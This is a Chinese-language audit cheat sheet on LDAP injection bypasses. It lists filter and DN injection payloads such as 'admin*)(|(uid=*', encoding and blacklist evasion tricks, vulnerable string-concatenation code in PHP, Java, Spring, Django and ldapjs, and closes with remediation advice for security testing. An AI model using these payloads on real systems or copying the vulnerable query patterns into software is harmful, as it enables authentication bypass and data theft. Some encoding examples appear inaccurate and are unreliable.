# LDAP 注入绕过技巧

本文档汇总常见的 LDAP 注入防护机制绕过技巧，用于深度安全审计和漏洞验证。

---

## 1. LDAP 过滤器注入绕过

### 基础过滤器语法注入

**防护机制**：黑名单过滤特殊字符、转义处理

#### 1.1 特殊字符过滤绕过
```
LDAP 特殊字符：* ( ) \ NULL NUL

# 防护：黑名单过滤
被拦截：admin*)(objectClass=*
绕过方式 1：使用转义序列
admin\2a\29\28objectClass\3d\2a

# 绕过方式 2：双重转义
admin\\2a\\29\\28objectClass\\3d\\2a

# 绕过方式 3：混合编码
admin%2a)(&(uid=*  # URL 编码

# 绕过方式 4：Unicode 编码
admin\u002a\u0029\u0028  # Unicode 转义

# 绕过方式 5：部分转义
admin*)(uid=*))(|(uid=*  # 只转义部分字符
```

#### 1.2 逻辑操作符注入
```
# 基础 AND 操作注入
原始过滤器：(&(uid=username)(password=password))

# 防护：检查括号平衡
被拦截：admin)(&(|(uid=*
绕过方式 1：使用通配符补全
admin*))(&(uid=admin
结果：(&(uid=admin*))(&(uid=admin)(password=*))

# 绕过方式 2：OR 操作符注入
admin)(|(uid=*
结果：(&(uid=admin)(|(uid=*)(password=password))

# 绕过方式 3：NOT 操作符注入
admin)(&(!(uid=*
结果：(&(uid=admin)(&(!(uid=*)(password=password))

# 绕过方式 4：空值注入
uid=*))(&(uid=*  # 创建条件始终为真
```

#### 1.3 属性值绕过
```
# 防护：检查输入长度或特定模式
被拦截：*
绕过方式 1：使用 LDAP 通配符组合
?*abc*  # ? 匹配单个字符，* 匹配任意

# 绕过方式 2：使用范围查询
[a-z]*  # 在某些 LDAP 实现中支持范围

# 绕过方式 3：使用十六进制编码
\2a  # * 的十六进制表示

# 绕过方式 4：空白符变体
admin    *  # 多个空格（某些转义不处理空格）

# 绕过方式 5：特殊编码字符
admin&#42;  # HTML 实体编码
```

---

## 2. DN（Distinguished Name）注入绕过

### DN 构造注入

**防护机制**：DN 特殊字符转义、DN 语法验证

#### 2.1 DN 组件注入
```
标准 DN：cn=admin,ou=users,dc=example,dc=com

# 防护：检查等号和逗号
被拦截：admin,ou=evil
绕过方式 1：使用 RDN 转义
admin\,ou=users\,dc=example
结果：cn=admin\,ou=users\,dc=example,ou=users,dc=example,dc=com

# 绕过方式 2：使用引号包含
"admin,ou=evil",ou=users,dc=example,dc=com

# 绕过方式 3：空白符处理
admin  ,ou=evil  # 前后空白在某些实现中被忽略

# 绕过方式 4：大小写混淆
CN=admin,OU=users,DC=example  # DN 属性名大小写不敏感

# 绕过方式 5：特殊字符十六进制编码
cn=admin\2cou=evil
```

#### 2.2 多值 RDN 注入
```
# 多值 RDN（相对识别名）允许多个属性
标准：cn=admin+uid=1,ou=users,dc=example,dc=com

# 防护：检查加号和等号
被拦截：admin+uid=evil
绕过方式 1：使用十六进制编码
admin\2buid=evil  # \2b 是 +

# 绕过方式 2：在允许的位置添加多值 RDN
cn=admin+uid=1+o=evil,ou=users,dc=example,dc=com

# 绕过方式 3：嵌套 DN 在属性值中
cn="admin,ou=users",ou=users,dc=example,dc=com
```

#### 2.3 基本 DN 注入
```
# 防护：基本 DN 验证
被拦截：dc=evil,dc=com
绕过方式 1：使用相对 DN
cn=admin,ou=users  # 相对于配置的基本 DN

# 绕过方式 2：LDAP URL 注入
ldap://server/cn=admin,ou=evil,dc=example,dc=com

# 绕过方式 3：使用别名和引用
cn=admin,ou=users,ou=evil,dc=example,dc=com
```

---

## 3. 转义和编码绕过

### 不完整转义处理

**防护机制**：使用转义函数（ldap_escape 等）

#### 3.1 转义函数绕过
```php
// PHP ldap_escape 函数
ldap_escape($input, null, LDAP_ESCAPE_FILTER);

// 防护：正确使用转义
// 被拦截：*
// 转义后：\2a

// 绕过方式 1：仅转义过滤器，DN 不转义
$dn = "cn=" . $user_input . ",ou=users,dc=example,dc=com";
$filter = "(&(uid=" . ldap_escape($user_input, null, LDAP_ESCAPE_FILTER) . "))";

// 绕过方式 2：两次处理用户输入
$input = ldap_escape($user_input);
$filter = "(&(uid=" . $input . "))";
// 但如果 $input 后来又被用于 DN，可能再次处理导致双重转义

// 绕过方式 3：字符选择性转义
// ldap_escape 可能不转义所有危险字符
```

#### 3.2 多层转义绕过
```
# 防护：单层转义
admin*

# 一层转义
admin\2a

# 二层转义
admin\\2a

# 多层绕过
原始转义：admin\2a
再次处理：admin\\32\\61  # 转义转义序列本身
```

#### 3.3 字符编码绕过
```
# UTF-8 编码
admin* → admin\xc2\xb6  # 某些字符的多字节表示

# Base64 编码
admin* → YWRtaW4q

# URL 编码
admin* → admin%2a

# 十进制编码
admin* → &#97;&#100;&#109;&#105;&#110;&#42;

# 混合编码
ad min*  # 某些编码可能被两次处理
```

---

## 4. 输入验证绕过

### 客户端和黑名单绕过

**防护机制**：客户端验证、黑名单过滤

#### 4.1 客户端验证绕过
```
# 防护：客户端验证（浏览器中）
javascript:
  if (!/^[a-zA-Z0-9]+$/.test(username)) {
    alert('Invalid username');
    return;
  }

// 绕过方式 1：直接 HTTP 请求
POST /login HTTP/1.1
username=admin*)(|(uid=*

// 绕过方式 2：禁用 JavaScript
// 浏览器开发者工具或 curl 请求

// 绕过方式 3：修改客户端验证
// 使用浏览器开发者工具修改验证代码
```

#### 4.2 黑名单绕过
```
# 防护：黑名单特定字符
blocked = ['*', '(', ')', '&', '|', '!']

# 绕过方式 1：使用允许字符构造注入
admin\2a\29\28|(  # 十六进制编码

# 绕过方式 2：使用空字符
admin\x00)(  # NULL 字符在某些实现中结束字符串

# 绕过方式 3：大小写混合
ADMIN*)(
AdMiN*)(

# 绕过方式 4：使用 Unicode 变体
ａｄｍｉｎ*  # 全角字符（某些验证不识别）

# 绕过方式 5：使用 LDAP 转义绕过黑名单
admin\5c*  # \5c 是反斜杠本身
```

#### 4.3 正则表达式绕过
```
# 防护：正则表达式验证
regex = /^[a-zA-Z0-9_.-]+$/

# 绕过方式 1：使用允许的字符组织注入
admin.*(|(uid=*

# 绕过方式 2：正则表达式锚点绕过
^user$  # 如果未正确锚定
user-admin*)(  # 绕过验证

# 绕过方式 3：换行符绕过
user\nadmin*)(  # 某些正则未使用 dotall 模式

# 绕过方式 4：使用 Unicode 正规化
user + combining characters
```

---

## 5. 参数化查询绕过

### 不完整参数化

**防护机制**：使用参数化 LDAP 查询

#### 5.1 部分参数化
```java
// 防护：使用参数化，但可能不完整
SearchControls searchControls = new SearchControls();
String[] attrs = {"cn", "mail"};
searchControls.setReturningAttributes(attrs);

// 绕过方式 1：DN 部分参数化，过滤器不参数化
String dn = getUserDN(user_input);  // 参数化
String filter = "(&(uid=" + user_input + "))";  // 直接拼接
NamingEnumeration<SearchResult> results = ctx.search(dn, filter, searchControls);

// 绕过方式 2：只参数化用户名，属性不参数化
String filter = "(&(uid=" + param1 + ")(attr=" + user_attr + "))";

// 绕过方式 3：搜索范围参数化不完整
String base = secure_dn;  // 参数化基础 DN
String filter = "(&(uid=" + user_input + "))";  // 但过滤器可能包含注入
```

#### 5.2 参数化 API 错误使用
```java
// 防护：某些库声称参数化，但实际上不完整
// ldapjs 示例
var filter = '(&(uid=' + username + '))';
client.search(base, filter, function(err, res) { ... });

// 绕过方式 1：过滤器仍是字符串拼接
// ldapjs filter 模块不是真正的参数化

// 绕过方式 2：使用不同的 API 组件
// 某些组件可能参数化，某些可能不参数化

// 绕过方式 3：混淆参数化和非参数化代码
secure_filter = build_safe_filter(param);  // 参数化
final_filter = secure_filter + "(" + user_input + ")";  // 再次注入
```

---

## 6. 二阶 LDAP 注入

### 存储和反射型注入

**防护机制**：输入验证、输出转义

#### 6.1 数据库存储注入
```
# 第一阶：存储恶意 LDAP 有效负载
用户名：admin*)(|(uid=*

# 第二阶：从数据库检索并用于 LDAP 查询
SELECT username FROM users WHERE id = 1;
// 返回：admin*)(|(uid=*
filter = "(&(uid=" + username + "))";
// 结果：(&(uid=admin*)(|(uid=*))
```

#### 6.2 LDAP 结果反射
```
# 防护：缺乏二阶防护
第一个 LDAP 查询：(&(uid=admin))
获得结果：{cn: "admin\x00", mail: "test@example.com"}

# 第二阶：使用结果构造新查询
var cn = ldap_result['cn'];  // "admin\x00"
var new_filter = "(&(cn=" + cn + "))";  // 可能包含特殊字符

// 绕过方式：如果 cn 在数据库中被存储为 "admin*"
```

---

## 7. 编码和规范化绕过

### 字符编码和转换

**防护机制**：规范化输入编码

#### 7.1 编码不一致
```
# 防护：验证 UTF-8 编码
if (!is_valid_utf8($input)) {
    reject();
}

# 绕过方式 1：双重 UTF-8 编码
admin*  → UTF-8 → \xc3\xb1  → 再次 UTF-8 转换

# 绕过方式 2：混合编码
部分 UTF-8，部分 UTF-16，部分 GB2312

# 绕过方式 3：覆盖 BOM（字节顺序标记）
\xef\xbb\xbf (UTF-8 BOM) + 恶意数据

# 绕过方式 4：使用 UTF-7 编码
admin&BBo-  # UTF-7 的特殊编码形式
```

#### 7.2 大小写规范化绕过
```
# 防护：将输入转换为小写并比较
user = tolower(input);
filter = "(&(uid=" + user + "))";

# 绕过方式 1：在大小写转换后注入
# 大小写转换可能不影响特殊字符
ADMIN*)(  → admin*)( （特殊字符保留）

# 绕过方式 2：使用某些字符的大小写变体
German ß 字符
```

---

## 8. LDAP 服务器特定绕过

### 不同 LDAP 实现的差异

**防护机制**：LDAP 服务器实现差异

#### 8.1 OpenLDAP vs Active Directory
```
# OpenLDAP 过滤器处理
(&(uid=admin*))  # OpenLDAP 严格解析

# Active Directory 过滤器处理
(&(sAMAccountName=admin*))  # AD 可能有不同的行为

# 绕过方式：利用实现差异
使用在 OpenLDAP 中无效但在 AD 中有效的语法
使用 AD 特定属性如 sAMAccountName
```

#### 8.2 LDAP 版本差异
```
# LDAP v2 vs v3
v2：较旧的实现，可能处理某些转义不同
v3：较新的实现，更严格的规范

# 绕过方式：
使用仅在 v2 中有效的语法
利用版本转换中的不一致
```

#### 8.3 扩展和自定义属性
```
# 某些 LDAP 服务器支持自定义属性或扩展
* (0.9.2342.19200300.100.1.1)  # 标准属性 OID

# 绕过方式：
使用 OID 代替属性名称
使用未被过滤的自定义扩展属性
```

---

## 9. 框架特定绕过

### Web 框架中的 LDAP 注入

#### 9.1 Spring LDAP 框架
```java
// 防护：使用 LdapQueryBuilder
LdapQuery query = LdapQueryBuilder.query()
    .where("cn").is(username);

// 绕过方式 1：直接字符串而非查询构建器
String filter = "(&(cn=" + username + "))";
ldapTemplate.search(filter, ...);

// 绕过方式 2：Builder API 误用
query.where("uid").like("*" + user_input + "*");
// 某些 like 操作可能不转义

// 绕过方式 3：链式调用中混合参数化和非参数化
LdapQuery query = LdapQueryBuilder.query()
    .where("cn").is(param1)
    .and("ou").is(org_input);  // org_input 可能不安全
```

#### 9.2 Django LDAP 认证
```python
# 防护：使用 django-ldap 库
import django_ldap

# 绕过方式 1：自定义用户查询
AUTH_LDAP_USER_SEARCH = LDAPSearch(
    "ou=users,dc=example,dc=com",
    ldap.SCOPE_SUBTREE,
    "(uid=%(user)s)"  # 库自动处理，但配置可能不安全
)

# 绕过方式 2：在认证前处理用户名
user = request.POST['username']
processed = user.replace('*', '')  # 不完整过滤
authenticate(username=processed)

# 绕过方式 3：使用额外的 LDAP 查询获取权限
extra_filter = "(groupMembership=" + group_input + ")"
```

#### 9.3 Express/Node.js LDAP
```javascript
// 防护：使用 ldapjs
var filter = '(&(uid=' + username + '))';

// 绕过方式 1：ldapjs 不提供真正的参数化
// 过滤器仍然是字符串拼接

// 绕过方式 2：使用原始 filter 对象
client.search(base, {
    filter: new Filter().and(
        new AttributeFilter({attribute: 'uid', value: username})
    )
}, ...);
// 但某些库的 filter API 实现可能不完整

// 绕过方式 3：中间件链中的多个处理步骤
app.use(sanitize_username);  // 可能不完整
app.post('/login', ldap_search);  // 仍然可能有注入
```

---

## 10. 防护机制检查清单

在进行安全审计时，检查以下防护机制：

| 防护机制 | 绕过难度 | 常见绕过方式 |
|---------|---------|----------|
| 黑名单过滤 | 低 | 编码、大小写混合、十六进制转义 |
| 客户端验证 | 低 | 直接 HTTP 请求、禁用 JavaScript |
| 不完整转义 | 低-中 | 部分转义、多层转义、选择性字符 |
| 部分参数化 | 中 | 混合参数化/非参数化、API 误用 |
| 框架默认行为 | 中 | 参数化 API 不完整实现、链式调用 |
| 编码规范化 | 中 | 双重编码、混合编码、BOM 覆盖 |
| 二阶注入 | 中-高 | 数据库反射、多阶段处理 |
| LDAP 服务器差异 | 高 | 实现特定的语法、版本差异 |

---

## 11. 审计建议

### 高风险指标
- LDAP 过滤器或 DN 由字符串拼接构造
- 仅使用黑名单过滤而无参数化
- 在多个步骤中处理用户输入（多层过滤器构造）
- 使用不完整的转义函数或错误使用 API
- 存在二阶 LDAP 注入风险（存储用户输入后再用于 LDAP 查询）

### 审计步骤
1. **定位 LDAP 查询点**：找出所有 ldap_search()、search()、filter() 等调用
2. **追踪用户输入**：确认哪些参数来自用户（请求参数、表单、文件等）
3. **验证转义处理**：检查是否使用了正确的转义函数或参数化
4. **尝试绕过**：使用本文档中的技巧测试防护
5. **评估后果**：分析成功注入导致的数据泄露、认证绕过等结果
6. **生成报告**：记录所有发现的漏洞及其危害

### 验证修复
修复 LDAP 注入漏洞时，确保：
- 使用参数化 LDAP 查询而非字符串拼接
- 对所有用户输入使用适当的转义函数（ldap_escape、library-provided escape methods）
- 同时转义过滤器和 DN 中的用户输入
- 避免二阶注入，当从数据库检索值用于新查询时也要转义
- 定期更新 LDAP 库和框架以获得安全修复
- 进行代码审计，重点关注 LDAP 查询构造逻辑
